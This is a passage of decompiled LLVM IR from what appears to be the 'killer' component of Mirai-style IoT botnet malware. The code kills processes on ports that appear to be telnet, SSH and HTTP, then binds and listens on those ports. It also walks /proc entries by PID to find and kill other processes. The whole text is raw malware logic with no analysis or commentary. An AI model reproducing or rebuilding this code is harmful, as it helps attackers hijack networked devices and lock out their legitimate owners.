  br i1 %v2_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cc7c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cc6c.loopexit, %dec_label_pc_ce68, %dec_label_pc_cc7c, %dec_label_pc_cc6c.preheader
  %v0_ce80 = load i32, i32* @sb, align 4
  %v1_ce84 = inttoptr i32 %v0_ce80 to i32*
  %v2_ce84 = call i32 @__GI_closedir(i32* %v1_ce84)
  %v0_ce88 = load i32, i32* @r5, align 4
  %v1_ce88 = urem i32 %v0_ce88, 256
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_ce80
  %storemerge = phi i32 [ %v1_ce88, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_cc4c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce90 = call i32 @sleep(i32 1)
  %v1_ce98 = call i32 @table_lock_val(i32 15)
  %v1_cea0 = call i32 @table_lock_val(i32 16)
  %v1_cea8 = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %bb, %dec_label_pc_ceec, %dec_label_pc_ce8c
  %v0_ceac = load i32, i32* @r4, align 4
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v6_c9a8, i32* @r5, align 4
  store i32 %v9_c9a8, i32* @r6, align 4
  store i32 %v12_c9a8, i32* @r7, align 4
  store i32 %v15_c9a8, i32* @r8, align 4
  store i32 %v18_c9a8, i32* @sb, align 4
  store i32 %v21_c9a8, i32* @sl, align 4
  store i32 %v24_c9a8, i32* @fp, align 4
  store i32 %v27_c9a8, i32* @lr, align 4
  ret i32 %v0_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cba0
  %v1_cec0 = add i32 %v0_cec0, 1
  %v7_cec4 = icmp eq i32 %v0_cec0, 0
  br i1 %v7_cec4, label %dec_label_pc_cecc, label %dec_label_pc_cba8

dec_label_pc_cecc:                                ; preds = %dec_label_pc_cec0
  %v1_cecc = add i32 %v0_cbb0, 3
  %v2_cecc = inttoptr i32 %v1_cecc to i8*
  %v3_cecc = load i8, i8* %v2_cecc, align 1
  %v7_ced0 = icmp eq i8 %v3_cecc, 65
  br i1 %v7_ced0, label %dec_label_pc_cee4, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_cee4
  %v0_cbb882 = phi i32 [ %v0_cbb883, %dec_label_pc_cecc ], [ 1, %dec_label_pc_cee4 ]
  br label %dec_label_pc_cb80.backedge

dec_label_pc_cb80.backedge:                       ; preds = %dec_label_pc_ced8, %dec_label_pc_cbac
  %v0_cbb881 = phi i32 [ %v0_cbb882, %dec_label_pc_ced8 ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v0_cec073 = phi i32 [ %v1_cec0, %dec_label_pc_ced8 ], [ %v0_cbac, %dec_label_pc_cbac ]
  %v0_cba0.pr70 = phi i32 [ 0, %dec_label_pc_ced8 ], [ %v0_cba0.pr71, %dec_label_pc_cbac ]
  %v0_cb80 = add i32 %v0_cbb0, 1
  %v1_cb80 = add i32 %v0_cbb0, 3
  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v4_cb80 = zext i8 %v3_cb80 to i32
  store i32 %v4_cb80, i32* @r3, align 4
  %v2_cb84 = icmp eq i8 %v3_cb80, 0
  %v1_cb88 = add i32 %v0_cb8878, 1
  br i1 %v2_cb84, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cecc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ced8

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cc30
  %v1_cef0 = call i32 @table_lock_val(i32 15)
  %v1_cef8 = call i32 @table_lock_val(i32 16)
  %v1_cf00 = call i32 @table_lock_val(i32 17)
  %v1_cf08 = call i32 @table_lock_val(i32 19)
  br label %dec_label_pc_ceac

dec_label_pc_cf10:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca54

; uselistorder directives
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v4_cb80, { 1, 0 }
  uselistorder i32 %v0_cbb881, { 1, 0 }
  uselistorder i32 %v1_cec0, { 1, 0 }
  uselistorder i32 %v2_ce74, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbf030, { 1, 0 }
  uselistorder i32 %v1_cc08, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cbac, { 1, 0 }
  uselistorder i32 %v0_cb8878, { 1, 0 }
  uselistorder i32 %v0_cec0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cbb883, { 1, 2, 0 }
  uselistorder i32 %v1_cb8854, { 1, 0 }
  uselistorder i32 %v2_cb6c, { 1, 0 }
  uselistorder i32 %v1_cb68, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cb28, { 0, 2, 1 }
  uselistorder i32 %v0_cb2816, { 1, 0 }
  uselistorder i32 %v1_caf4, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca84, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 1, 0 }
  uselistorder i32 %v2_ca28, { 1, 0, 2 }
  uselistorder i8* %v3_ca10, { 1, 0, 2 }
  uselistorder i32 %v2_c9f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ced8, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_cd78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca98.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8404 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %v3_cf3c = load i32, i32* @r4, align 4
  %v6_cf3c = load i32, i32* @r5, align 4
  %v9_cf3c = load i32, i32* @r6, align 4
  %v12_cf3c = load i32, i32* @r7, align 4
  %v15_cf3c = load i32, i32* @r8, align 4
  %v18_cf3c = load i32, i32* @sb, align 4
  %v21_cf3c = load i32, i32* @sl, align 4
  %v24_cf3c = load i32, i32* @fp, align 4
  %v27_cf3c = load i32, i32* @lr, align 4
  %v2_cf4c = call i32 @__GI_time(i32* null)
  store i32 %v2_cf4c, i32* @r7, align 4
  %v0_cf54 = call i32 @__libc_fork()
  %v7_cf58 = icmp eq i32 %v0_cf54, -1
  %. = zext i1 %v7_cf58 to i32
  %tmp157 = icmp slt i32 %v0_cf54, 1
  %storemerge126 = select i1 %tmp157, i32 %., i32 1
  store i32 %storemerge126, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24734.70 to i32), i32* %r3.global-to-local, align 4
  %v2_cf74 = icmp eq i32 %storemerge126, 0
  store i32 %v0_cf54, i32* @global_var_24734.70, align 4
  br i1 %v2_cf74, label %dec_label_pc_cf90, label %dec_label_pc_cf80

dec_label_pc_cf80:                                ; preds = %dec_label_pc_d1f8, %dec_label_pc_d0e0, %entry
  %v1_cf8c = phi i32 [ %v2_d194, %dec_label_pc_d0e0 ], [ %v0_cf54, %entry ], [ 0, %dec_label_pc_d1f8 ]
  store i32 %v3_cf3c, i32* @r4, align 4
  store i32 %v6_cf3c, i32* @r5, align 4
  store i32 %v9_cf3c, i32* @r6, align 4
  store i32 %v12_cf3c, i32* @r7, align 4
  store i32 %v15_cf3c, i32* @r8, align 4
  store i32 %v18_cf3c, i32* @sb, align 4
  store i32 %v21_cf3c, i32* @sl, align 4
  store i32 %v24_cf3c, i32* @fp, align 4
  store i32 %v27_cf3c, i32* @lr, align 4
  ret i32 %v1_cf8c

dec_label_pc_cf90:                                ; preds = %entry
  %v2_cf90 = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v1_cfa4 = call i32 @killer_kill_by_port(i32 5888)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfb8 = load i32, i32* @r5, align 4
  store i32 %v0_cfb8, i32* %r2.global-to-local, align 4
  %v3_cfc0 = call i32 @socket(i32 2, i32 1, i32 %v0_cfb8)
  %v7_cfc4 = icmp eq i32 %v3_cfc0, -1
  store i32 %v3_cfc0, i32* @r4, align 4
  br i1 %v7_cfc4, label %dec_label_pc_cfec, label %dec_label_pc_cfd0

dec_label_pc_cfd0:                                ; preds = %dec_label_pc_cf90
  %v2_cfd4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_cfd4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfdc = call i32 @bind(i32 %v3_cfc0, i32 %v2_cfd4, i32 16)
  %v0_cfe0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cfe8 = call i32 @listen(i32 %v0_cfe0, i32 1)
  br label %dec_label_pc_cfec

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd0
  %v1_cff0 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d004 = load i32, i32* @r5, align 4
  store i32 %v0_d004, i32* %r2.global-to-local, align 4
  %v3_d00c = call i32 @socket(i32 2, i32 1, i32 %v0_d004)
  %v7_d010 = icmp eq i32 %v3_d00c, -1
  store i32 %v3_d00c, i32* @r4, align 4
  br i1 %v7_d010, label %dec_label_pc_d038, label %dec_label_pc_d01c

dec_label_pc_d01c:                                ; preds = %dec_label_pc_cfec
  %v2_d020 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d020, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d028 = call i32 @bind(i32 %v3_d00c, i32 %v2_d020, i32 16)
  %v0_d02c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d034 = call i32 @listen(i32 %v0_d02c, i32 1)
  br label %dec_label_pc_d038

dec_label_pc_d038:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_d01c
  %v1_d040 = call i32 @killer_kill_by_port(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d058 = load i32, i32* @r5, align 4
  store i32 %v0_d058, i32* %r2.global-to-local, align 4
  %v3_d060 = call i32 @socket(i32 2, i32 1, i32 %v0_d058)
  %v7_d064 = icmp eq i32 %v3_d060, -1
  store i32 %v3_d060, i32* @r4, align 4
  br i1 %v7_d064, label %dec_label_pc_d08c, label %dec_label_pc_d070

dec_label_pc_d070:                                ; preds = %dec_label_pc_d038
  %v2_d074 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d074, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d07c = call i32 @bind(i32 %v3_d060, i32 %v2_d074, i32 16)
  %v0_d080 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d088 = call i32 @listen(i32 %v0_d080, i32 1)
  br label %dec_label_pc_d08c

dec_label_pc_d08c:                                ; preds = %dec_label_pc_d038, %dec_label_pc_d070
  %v2_d094 = call i32 @killer_kill_by_port(i32 ptrtoint ([3 x i8]* @global_var_c707.74 to i32))
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d0ac = load i32, i32* @r5, align 4
  store i32 %v0_d0ac, i32* %r2.global-to-local, align 4
  %v3_d0b4 = call i32 @socket(i32 2, i32 1, i32 %v0_d0ac)
  %v7_d0b8 = icmp eq i32 %v3_d0b4, -1
  store i32 %v3_d0b4, i32* @r4, align 4
  br i1 %v7_d0b8, label %dec_label_pc_d0e0, label %dec_label_pc_d0c4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d08c
  %v2_d0c8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d0c8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d0d0 = call i32 @bind(i32 %v3_d0b4, i32 %v2_d0c8, i32 16)
  %v0_d0d4 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d0dc = call i32 @listen(i32 %v0_d0d4, i32 1)
  br label %dec_label_pc_d0e0

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d08c, %dec_label_pc_d0c4
  %v1_d0e4 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d0ec = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_21c14.76 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24730.78 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d0ec, i32* %r2.global-to-local, align 4
  %v0_d0fc = load i32, i32* @r5, align 4
  %v1_d0fc = trunc i32 %v0_d0fc to i8
  %v3_d0fc = inttoptr i32 %v0_d0ec to i8*
  store i8 %v1_d0fc, i8* %v3_d0fc, align 1
  %v0_d104 = load i32, i32* @r5, align 4
  %v1_d104 = load i32, i32* %r3.global-to-local, align 4
  %v2_d104 = inttoptr i32 %v1_d104 to i32*
  store i32 %v0_d104, i32* %v2_d104, align 4
  %v0_d108 = load i32, i32* %r2.global-to-local, align 4
  %v1_d108 = load i32, i32* %r1.global-to-local, align 4
  %v2_d108 = inttoptr i32 %v1_d108 to i32*
  store i32 %v0_d108, i32* %v2_d108, align 4
  %v1_d10c = call i32 @table_unlock_val(i32 15)
  %v1_d114 = call i32 @table_unlock_val(i32 16)
  %v2_d118 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d118, i32* %r2.global-to-local, align 4
  %v0_d11c = load i32, i32* @r5, align 4
  store i32 %v0_d11c, i32* %r1.global-to-local, align 4
  %v2_d128 = inttoptr i32 %v0_d11c to i32*
  %v3_d128 = call i32 @table_retrieve_val(i32 15, i32* %v2_d128)
  %v1_d130 = add i32 %v2_d118, -44
  store i32 %v1_d130, i32* %r3.global-to-local, align 4
  store i32 %v3_d128, i32* %r1.global-to-local, align 4
  store i32 %v1_d130, i32* @r0, align 4
  %v2_d140 = inttoptr i32 %v1_d130 to i8*
  %v3_d140 = call i32 @util_strcpy(i8* %v2_d140, i32 %v3_d128)
  %v2_d148 = add i32 %v3_d140, %v1_d130
  store i32 %v2_d148, i32* @r4, align 4
  %v1_d14c = call i32 @__getpid(i32 %v3_d140)
  %v2_d154 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_d154, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d15c = trunc i32 %v1_d14c to i8
  %v4_d15c = call i32 @util_itoa(i8 %v3_d15c, i32 10, i32 %v2_d154)
  store i32 %v4_d15c, i32* %r1.global-to-local, align 4
  %v0_d164 = load i32, i32* @r4, align 4
  store i32 %v0_d164, i32* @r0, align 4
  %v2_d168 = inttoptr i32 %v0_d164 to i8*
  %v3_d168 = call i32 @util_strcpy(i8* %v2_d168, i32 %v4_d15c)
  %v0_d16c = load i32, i32* @r5, align 4
  store i32 %v0_d16c, i32* %r1.global-to-local, align 4
  %v1_d170 = load i32, i32* @r4, align 4
  %v2_d170 = add i32 %v1_d170, %v3_d168
  store i32 %v2_d170, i32* @r4, align 4
  %v2_d178 = inttoptr i32 %v0_d16c to i32*
  %v3_d178 = call i32 @table_retrieve_val(i32 16, i32* %v2_d178)
  store i32 %v3_d178, i32* %r1.global-to-local, align 4
  %v0_d180 = load i32, i32* @r4, align 4
  store i32 %v0_d180, i32* @r0, align 4
  %v2_d184 = inttoptr i32 %v0_d180 to i8*
  %v3_d184 = call i32 @util_strcpy(i8* %v2_d184, i32 %v3_d178)
  %v0_d188 = load i32, i32* @r5, align 4
  store i32 %v0_d188, i32* %r1.global-to-local, align 4
  store i32 %v3_d184, i32* @r6, align 4
  %v2_d194 = call i32 @__libc_open(i32 %v1_d130, i32 %v0_d188)
  %v7_d198 = icmp eq i32 %v2_d194, -1
  br i1 %v7_d198, label %dec_label_pc_cf80, label %dec_label_pc_d1a0

dec_label_pc_d1a0:                                ; preds = %dec_label_pc_d0e0
  %v1_d1a0 = call i32 @__GI___libc_close(i32 %v2_d194)
  %v1_d1a8 = call i32 @table_lock_val(i32 15)
  %v1_d1b0 = call i32 @table_lock_val(i32 16)
  store i32 ptrtoint (i32* @global_var_24730.78 to i32), i32* %r3.global-to-local, align 4
  %v2_d1bc = load i32, i32* @global_var_24730.78, align 4
  store i32 %v2_d1bc, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d1c8 = call i32 @readlink(i32 %v1_d130, i32 %v2_d1bc, i32 4095)
  %v7_d1cc = icmp eq i32 %v3_d1c8, -1
  br i1 %v7_d1cc, label %.thread9, label %bb160

bb160:                                            ; preds = %dec_label_pc_d1a0
  %v3_d1d4 = load i32, i32* @global_var_24730.78, align 4
  store i32 %v3_d1d4, i32* %r3.global-to-local, align 4
  %v1_d1d8 = load i32, i32* @r5, align 4
  %v2_d1d8 = trunc i32 %v1_d1d8 to i8
  %v5_d1d8 = add i32 %v3_d1d4, %v3_d1c8
  %v6_d1d8 = inttoptr i32 %v5_d1d8 to i8*
  store i8 %v2_d1d8, i8* %v6_d1d8, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d1a0, %bb160
  store i32 %v1_d130, i32* @r0, align 4
  %v0_d1e0 = load i32, i32* @r6, align 4
  %v1_d1e0 = load i32, i32* @r4, align 4
  %v1_d130.neg = sub i32 44, %v2_d118
  %v2_d1e0 = add i32 %v1_d130.neg, %v0_d1e0
  %v2_d1e4 = add i32 %v2_d1e0, %v1_d1e0
  store i32 %v2_d1e4, i32* @r1, align 4
  %v0_d1e8 = call i32 @util_zero()
  %v0_d1ec = load i32, i32* @r7, align 4
  store i32 %v0_d1ec, i32* @r4, align 4
  %v0_d1f0 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d2fc = ptrtoint i32* %stack_var_-148 to i32
  %v2_d300 = bitcast i32* %stack_var_-148 to i8*
  %v2_d34c = ptrtoint i32* %stack_var_-212 to i32
  %v2_d350 = bitcast i32* %stack_var_-212 to i8*
  %v2_d4ac = ptrtoint i32* %stack_var_-44 to i32
  %v2_d4bc = ptrtoint i32* %stack_var_-48 to i32
  %v2_d4d4 = ptrtoint i32* %stack_var_-52 to i32
  %v2_d4e8 = ptrtoint i32* %stack_var_-8404 to i32
  br label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %dec_label_pc_d2c0, %.thread9
  %stack_var_-8412.0 = phi i32 [ %v0_d1f0, %.thread9 ], [ %stack_var_-8412.3, %dec_label_pc_d2c0 ]
  %v1_d1fc = call i32 @table_unlock_val(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d208 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_d20c = call i32 @__GI_opendir(i32 %v3_d208)
  store i32 %v1_d20c, i32* @sb, align 4
  %v2_d210 = icmp eq i32 %v1_d20c, 0
  br i1 %v2_d210, label %dec_label_pc_cf80, label %dec_label_pc_d218

dec_label_pc_d218:                                ; preds = %dec_label_pc_d1f8
  %v1_d21c = call i32 @table_lock_val(i32 15)
  %v0_d22080 = load i32, i32* @sb, align 4
  %v1_d22481 = inttoptr i32 %v0_d22080 to i32*
  %v2_d22482 = call i32 @__GI_readdir(i32* %v1_d22481)
  %v2_d22884 = icmp eq i32 %v2_d22482, 0
  br i1 %v2_d22884, label %dec_label_pc_d2c0, label %dec_label_pc_d230.preheader

dec_label_pc_d230.preheader:                      ; preds = %dec_label_pc_d218, %dec_label_pc_d220.backedge
  %v0_d23093 = phi i32 [ %v2_d224, %dec_label_pc_d220.backedge ], [ %v2_d22482, %dec_label_pc_d218 ]
  %stack_var_-8412.185 = phi i32 [ %stack_var_-8412.1.be, %dec_label_pc_d220.backedge ], [ %stack_var_-8412.0, %dec_label_pc_d218 ]
  br label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d230.preheader, %dec_label_pc_d2a8
  %v0_d240 = phi i32 [ %v2_d2b4, %dec_label_pc_d2a8 ], [ %v0_d23093, %dec_label_pc_d230.preheader ]
  %stack_var_-8412.2 = phi i32 [ %v1_d254, %dec_label_pc_d2a8 ], [ %stack_var_-8412.185, %dec_label_pc_d230.preheader ]
  %v1_d230 = add i32 %v0_d240, 11
  %v2_d230 = inttoptr i32 %v1_d230 to i8*
  %v3_d230 = load i8, i8* %v2_d230, align 1
  %v4_d230 = zext i8 %v3_d230 to i32
  %v1_d234 = add nsw i32 %v4_d230, -48
  store i32 %v1_d234, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d234, 9
  br i1 %tmp, label %dec_label_pc_d220.backedge, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d230
  store i32 %v1_d230, i32* @r6, align 4
  store i32 %v1_d230, i32* @r0, align 4
  %v1_d248 = call i32 @atol(i32 %v1_d230)
  %v0_d250 = load i32, i32* @r5, align 4
  %v1_d254 = add i32 %stack_var_-8412.2, 1
  store i32 %v1_d254, i32* %r1.global-to-local, align 4
  store i32 %v1_d248, i32* @r7, align 4
  %v5_d260 = icmp slt i32 %v0_d250, %v1_d248
  %v2_d2d0 = call i32 @__GI_time(i32* null)
  br i1 %v5_d260, label %dec_label_pc_d2cc, label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d240
  %v0_d26c = load i32, i32* @r4, align 4
  %v2_d26c = sub i32 %v2_d2d0, %v0_d26c
  %v7_d274 = icmp slt i32 %v2_d26c, 601
  br i1 %v7_d274, label %dec_label_pc_d27c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d264
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d220.backedge

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d264
  %v0_d27c = load i32, i32* @r7, align 4
  %v7_d280 = icmp slt i32 %v0_d27c, 401
  br i1 %v7_d280, label %dec_label_pc_d220.backedge, label %dec_label_pc_d284

dec_label_pc_d284:                                ; preds = %dec_label_pc_d27c
  %v3_d28c = zext i32 %v1_d254 to i64
  %v4_d28c = mul nuw i64 %v3_d28c, 3435973837
  %v3_d2901 = udiv i64 %v4_d28c, 34359738368
  %v3_d2943 = mul nuw nsw i64 %v3_d2901, 8
  %v3_d294 = trunc i64 %v3_d2943 to i32
  store i32 %v3_d294, i32* %r3.global-to-local, align 4
  %v2_d2985 = mul nuw nsw i64 %v3_d2901, 2
  %v2_d298 = trunc i64 %v2_d2985 to i32
  %v2_d29c = add i32 %v3_d294, %v2_d298
  store i32 %v2_d29c, i32* %r2.global-to-local, align 4
  %v9_d2a0 = icmp eq i32 %v1_d254, %v2_d29c
  br i1 %v9_d2a0, label %dec_label_pc_d2a8, label %dec_label_pc_d220.backedge

dec_label_pc_d2a8:                                ; preds = %dec_label_pc_d284
  %v1_d2ac = call i32 @sleep(i32 1)
  %v0_d2b0 = load i32, i32* @sb, align 4
  %v1_d2b4 = inttoptr i32 %v0_d2b0 to i32*
  %v2_d2b4 = call i32 @__GI_readdir(i32* %v1_d2b4)
  %v2_d2b8 = icmp eq i32 %v2_d2b4, 0
  br i1 %v2_d2b8, label %dec_label_pc_d2c0, label %dec_label_pc_d230

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d220.backedge, %dec_label_pc_d2a8, %dec_label_pc_d218
  %stack_var_-8412.3 = phi i32 [ %stack_var_-8412.0, %dec_label_pc_d218 ], [ %v1_d254, %dec_label_pc_d2a8 ], [ %stack_var_-8412.1.be, %dec_label_pc_d220.backedge ]
  %v0_d2c0 = load i32, i32* @sb, align 4
  %v1_d2c4 = inttoptr i32 %v0_d2c0 to i32*
  %v2_d2c4 = call i32 @__GI_closedir(i32* %v1_d2c4)
  br label %dec_label_pc_d1f8

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d240
  %v1_d2dc = call i32 @table_unlock_val(i32 15)
  %v1_d2e4 = call i32 @table_unlock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2f0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d2f0, i32* %r1.global-to-local, align 4
  store i32 %v2_d2fc, i32* @r0, align 4
  %v3_d300 = call i32 @util_strcpy(i8* %v2_d300, i32 %v3_d2f0)
  %v2_d30c = add i32 %v3_d300, %v2_d2fc
  store i32 %v2_d30c, i32* %r5.global-to-local, align 4
  store i32 %v2_d30c, i32* @r0, align 4
  %v0_d314 = load i32, i32* @r6, align 4
  store i32 %v0_d314, i32* %r1.global-to-local, align 4
  %v2_d318 = inttoptr i32 %v2_d30c to i8*
  %v3_d318 = call i32 @util_strcpy(i8* %v2_d318, i32 %v0_d314)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d328 = call i32 @table_retrieve_val(i32 16, i32* null)
  store i32 %v3_d328, i32* %r1.global-to-local, align 4
  %v1_d330 = load i32, i32* %r5.global-to-local, align 4
  %v2_d330 = add i32 %v1_d330, %v3_d318
  store i32 %v2_d330, i32* @r0, align 4
  %v2_d334 = inttoptr i32 %v2_d330 to i8*
  %v3_d334 = call i32 @util_strcpy(i8* %v2_d334, i32 %v3_d328)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d340 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d340, i32* %r1.global-to-local, align 4
  store i32 %v2_d34c, i32* @r0, align 4
  %v3_d350 = call i32 @util_strcpy(i8* %v2_d350, i32 %v3_d340)
  store i32 %v2_d34c, i32* %r2.global-to-local, align 4
  %v2_d35c = add i32 %v3_d350, %v2_d34c
  store i32 %v2_d35c, i32* @r5, align 4
  %v0_d360 = load i32, i32* @r6, align 4
  store i32 %v0_d360, i32* %r1.global-to-local, align 4
  store i32 %v2_d35c, i32* @r0, align 4
  %v2_d368 = inttoptr i32 %v2_d35c to i8*
  %v3_d368 = call i32 @util_strcpy(i8* %v2_d368, i32 %v0_d360)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d368, i32* @r4, align 4
  %v3_d378 = call i32 @table_retrieve_val(i32 32, i32* null)
  store i32 %v3_d378, i32* %r1.global-to-local, align 4
  %v0_d380 = load i32, i32* @r4, align 4
  %v1_d380 = load i32, i32* @r5, align 4
  %v2_d380 = add i32 %v1_d380, %v0_d380
  store i32 %v2_d380, i32* @r0, align 4
  %v2_d384 = inttoptr i32 %v2_d380 to i8*
  %v3_d384 = call i32 @util_strcpy(i8* %v2_d384, i32 %v3_d378)
  %v1_d38c = call i32 @table_lock_val(i32 15)
  %v1_d394 = call i32 @table_lock_val(i32 16)
  store i32 %v1_d130, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d3ac = call i32 @readlink(i32 %v2_d2fc, i32 %v1_d130, i32 4095)
  %v7_d3b0 = icmp eq i32 %v3_d3ac, -1
  store i32 %v3_d3ac, i32* @r5, align 4
  br i1 %v7_d3b0, label %dec_label_pc_d474, label %dec_label_pc_d3bc

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d2cc
  store i32 %v1_d130, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d3c4 = add i32 %v3_d3ac, %v1_d130
  %v5_d3c4 = inttoptr i32 %v4_d3c4 to i8*
  store i8 0, i8* %v5_d3c4, align 1
  %v1_d3cc = call i32 @table_unlock_val(i32 33)
  %v0_d3d0 = load i32, i32* @r4, align 4
  store i32 %v0_d3d0, i32* %r1.global-to-local, align 4
  %v2_d3d8 = inttoptr i32 %v0_d3d0 to i32*
